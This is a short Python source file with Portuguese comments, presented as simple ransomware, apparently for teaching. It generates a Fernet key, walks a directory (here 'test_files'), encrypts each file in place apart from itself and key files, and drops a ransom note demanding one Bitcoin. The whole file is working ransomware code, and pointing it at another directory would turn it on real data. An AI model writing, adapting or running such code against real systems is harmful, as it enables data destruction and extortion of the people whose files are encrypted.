from cryptography.fernet import Fernet
import os

#1 Gerar uma chave de criptografia

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
        
#2. Carregar a chave de criptografia

def carregar_chave():
    return open("chave.key", "rb").read()

#3. Criptografar um único arquivo

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_criptografados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_criptografados)
    print(f"Arquivo {arquivo} criptografado com sucesso.")
        
#4. Encontrar aruivos para criptografar

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5. Mensagem de resgate

def criar_mensagem_resgate():
    with open("LEIA ISSO.TXT", "w") as file:
        file.write("Seus arquivos foram criptografados!\n")
        file.write("Para recuperar seus arquivos, envie 1 Bitcoin para o endereço XYZ.\n")
        file.write("Após o pagamento, envie um e-mail para recuperar seus arquivos.\n") 
        
#6. Função principal

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Todos os arquivos foram criptografados. Leia o arquivo 'LEIA ISSO.TXT' para mais informações.")

if __name__ == "__main__":
    main()# Ransomware simples em Python
